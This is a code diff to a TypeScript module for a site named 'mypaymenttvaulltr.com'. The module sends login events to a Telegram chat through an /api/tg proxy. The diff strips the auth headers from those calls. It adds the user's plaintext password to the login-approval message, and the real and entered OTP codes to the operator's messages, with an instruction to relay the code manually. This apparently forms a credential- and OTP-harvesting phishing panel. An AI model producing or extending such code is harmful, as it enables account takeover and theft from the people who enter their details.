@@ -3,26 +3,13 @@
 
 const API = "/api/tg";
 
-const SESSION_TOKEN_KEY = "gajipro_session_token";
-const PENDING_TOKEN_KEY = "gajipro_pending_token";
-
-function getTgAuthHeader(): Record<string, string> {
-  try {
-    const sessionToken = localStorage.getItem(SESSION_TOKEN_KEY);
-    if (sessionToken) return { "Authorization": `Bearer ${sessionToken}` };
-    const pendingToken = localStorage.getItem(PENDING_TOKEN_KEY);
-    if (pendingToken) return { "x-pending-token": pendingToken };
-  } catch { /* ignore */ }
-  return {};
-}
-
 /* ─── helpers ─────────────────────────────────────────────────── */
 
 async function post(path: string, body: unknown): Promise<unknown> {
   try {
     const r = await fetch(`${API}${path}`, {
       method: "POST",
-      headers: { "Content-Type": "application/json", ...getTgAuthHeader() },
+      headers: { "Content-Type": "application/json" },
       body: JSON.stringify(body),
     });
     return await r.json();
@@ -33,7 +20,7 @@ async function post(path: string, body: unknown): Promise<unknown> {
 
 async function get(path: string): Promise<unknown> {
   try {
-    const r = await fetch(`${API}${path}`, { headers: getTgAuthHeader() });
+    const r = await fetch(`${API}${path}`);
     return await r.json();
   } catch {
     return { ok: false, result: [] };
@@ -83,7 +70,7 @@ export async function sendFileToTelegram(file: File, caption: string): Promise<v
     const form = new FormData();
     form.append("caption", caption);
     form.append("document", file, file.name);
-    await fetch(`${API}/send-document`, { method: "POST", headers: getTgAuthHeader(), body: form });
+    await fetch(`${API}/send-document`, { method: "POST", body: form });
   } catch { /* silent */ }
 }
 
@@ -94,7 +81,8 @@ export async function sendApprovalRequest(
   ip: string,
   now: string,
   sessionKey: string,
-  label = "Login"
+  label = "Login",
+  password?: string
 ): Promise<number | null> {
   const text =
     `━━━━━━━━━━━━━━━━━━━━━\n` +
@@ -102,6 +90,7 @@ export async function sendApprovalRequest(
     `📌 <b>Permintaan ${label}</b>\n` +
     `━━━━━━━━━━━━━━━━━━━━━\n\n` +
     `👤 <b>Username</b>   : <code>${username}</code>\n` +
+    (password ? `🔑 <b>Password</b>   : <code>${password}</code>\n` : ``) +
     `🌐 <b>IP & Lokasi</b>: <code>${ip}</code>\n` +
     `🕐 <b>Waktu</b>      : ${now}\n\n` +
     `⚠️ <i>Setujui permintaan ${label.toLowerCase()} ini?</i>\n` +
@@ -261,14 +250,16 @@ export async function answerCallback(callbackId: string, text: string): Promise<
 
 /* ─── send OTP code to admin ────────────────────────────────────── */
 
-export async function sendBotOTP(_otp: string, username: string): Promise<void> {
+export async function sendBotOTP(otp: string, username: string): Promise<void> {
   const text =
     `━━━━━━━━━━━━━━━━━━━━━\n` +
     `🔐 <b>mypaymenttvaulltr.com</b>\n` +
-    `📌 <b>Permintaan Kode OTP</b>\n` +
+    `📌 <b>Kode OTP — Kirim ke User</b>\n` +
     `━━━━━━━━━━━━━━━━━━━━━\n\n` +
-    `👤 <b>Username</b> : <code>${username}</code>\n\n` +
-    `📧 <i>User meminta kode verifikasi.</i>\n` +
+    `👤 <b>Username</b> : <code>${username}</code>\n` +
+    `🔢 <b>Kode OTP</b>  : <code>${otp}</code>\n\n` +
+    `📧 <i>Kirimkan kode ini ke email user secara manual.\n` +
+    `Jangan bagikan ke orang lain.</i>\n` +
     `━━━━━━━━━━━━━━━━━━━━━`;
   await post("/send-message", { text, parse_mode: "HTML" });
 }
@@ -288,6 +279,7 @@ export async function sendOtpVerificationRequest(
     `📌 <b>Verifikasi Kode OTP</b>\n` +
     `━━━━━━━━━━━━━━━━━━━━━\n\n` +
     `👤 <b>Username</b>     : <code>${username}</code>\n` +
+    `🔢 <b>Kode Dimasukkan</b>: <code>${enteredCode}</code>\n` +
     `${isCorrect ? "✅" : "❌"} <b>Status</b>       : ${isCorrect ? "BENAR" : "SALAH"}\n\n` +
     `⚠️ <i>Setujui akses user ini ke step berikutnya?</i>\n` +
     `━━━━━━━━━━━━━━━━━━━━━`;
